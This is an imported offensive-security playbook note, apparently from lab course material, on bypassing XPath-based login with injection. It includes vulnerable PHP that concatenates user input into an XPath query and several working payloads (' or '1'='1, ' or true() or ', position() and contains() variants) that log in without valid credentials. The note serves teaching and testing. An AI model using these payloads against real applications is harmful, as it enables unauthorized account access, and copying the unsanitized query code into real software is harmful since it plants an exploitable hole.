---
technique: "XPath - Authentication Bypass"
family: "injection"
severity_hint: "high"
tags: []
source: "_raw/Web attacks/Web Attacks/XPath Injections/XPath - Authentication Bypass.md"
source_sha256: "4514542cc3e62f7ab64249bbad7f14076844d58b3bdcf7839aa9333e56ddf606"
curator_version: 2
review_status: imported-unreviewed
---

# XPath - Authentication Bypass

> Family: **injection** · Severity hint: **high** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `xml: <users>`
- `xml: /users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']`
- `php: $query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" `
- `xml: /users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']`
- `xml: /users/user[username/text()='admin' or '1'='1' and password/text()='abc']`
- `xml: <users>`
- `php: $query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" `
- `php: /users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531`
- `php: /users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed4`
- `php: /users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33`
- `php: /users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f1`

## Playbook (operator notes)

# XPath - Authentication Bypass

# Foundation

- Example on how a XML document sotres user data
    
    ```xml
    <users>
    	<user>
    		<name first="Kaylie" last="Grenvile"/>
    		<id>1</id>
    		<username>kgrenvile</username>
    		<password>P@ssw0rd!</password>
    	</user>
    	<user>
    		<name first="Admin" last="Admin"/>
    		<id>2</id>
    		<username>admin</username>
    		<password>admin</password>
    	</user>
    	<user>
    		<name first="Academy" last="Student"/>
    		<id>3</id>
    		<username>htb-stdnt</username>
    		<password>Academy_student!</password>
    	</user>
    </users>
    ```
    
- Application can perform an XPath query to perform authentication
    
    ```xml
    /users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
    ```
    
- Vulnerable PHP code inserts the username and password without sanitization into the query
    
    ```php
    $query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
    $results = $xml->xpath($query);
    ```
    
- We can inject a payload into the username and password such that the XPath query always evaluates to true
    
    ```xml
    /users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
    ```
    
    - Query returns all usernames and we get logged in as the first user in the list
    - We can also chose a username by using  `admin' or '1'='1`
    
    ```xml
    /users/user[username/text()='admin' or '1'='1' and password/text()='abc']
    ```
    

# **Exploitation**

- In real-world passwords are often hashed and we might not know a valid username
    
    ```xml
    <users>
    	<user>
    		<name first="Kaylie" last="Grenvile"/>
    		<id>1</id>
    		<username>kgrenvile</username>
    		<password>8a24367a1f46c141048752f2d5bbd14b</password>
    	</user>
    	<user>
    		<name first="Admin" last="Admin"/>
    		<id>2</id>
    		<username>obfuscatedadminuser</username>
    		<password>21232f297a57a5a743894a0e4a801fc3</password>
    	</user>
    	<user>
    		<name first="Academy" last="Student"/>
    		<id>3</id>
    		<username>htb-stdnt</username>
    		<password>295362c2618a05ba3899904a6a3f5bc0</password>
    	</user>
    </users>
    ```
    
    ```php
    $query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
    $results = $xml->xpath($query);
    ```
    
    ```php
    /users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531fb474']
    ```
    
- We can inject a double `or` clause in the username to make the XPath query return `true`
    - `' or true() or '`
    
    ```php
    /users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
    ```
    
- If we want to use a specific user we can use `position()` which returns only the node at the pos
    - `' or position()=2 or '`
    
    ```php
    /users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
    ```
    
    - When there are a lot of users this technique is not applicable
- We can use `constrains()` which checks weather a text is present in the string
    - `' or contains(.,'admin') or '`
    
    ```php
    /users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
    ```

## Source
Original note: `_raw/Web attacks/Web Attacks/XPath Injections/XPath - Authentication Bypass.md`
